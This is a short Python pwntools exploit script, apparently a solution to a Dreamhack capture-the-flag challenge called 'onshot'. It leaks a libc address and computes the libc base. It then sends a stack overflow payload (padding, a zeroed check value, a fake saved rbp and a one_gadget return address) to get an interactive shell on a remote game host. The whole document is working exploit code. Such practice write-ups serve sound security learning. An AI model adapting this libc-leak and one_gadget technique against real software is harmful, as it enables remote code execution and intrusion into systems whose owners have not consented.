from pwn import *

def start():
    if args.REMOTE:
        host="host8.dreamhack.games"
        port=16125
        return remote(host,port)
    else:
        return process('./onshot')
p=start()

context.arch='amd64'
context.log_level = 'debug'

libc = ELF('libc.so.6')
one_gadget=0x45216

p.recvuntil('stdout: ')

stdout = int(p.recvline()[:-1],16)
libc_base=stdout-libc.symbols["_IO_2_1_stdout_"]
one_gadget= libc_base+one_gadget

payload = b'a'*24#지역변수 패딩
payload += b'\x00'*8#check
payload += b'b'*8#rbp
payload += p64(one_gadget)#rip

p.sendafter('MSG: ',payload)
p.interactive()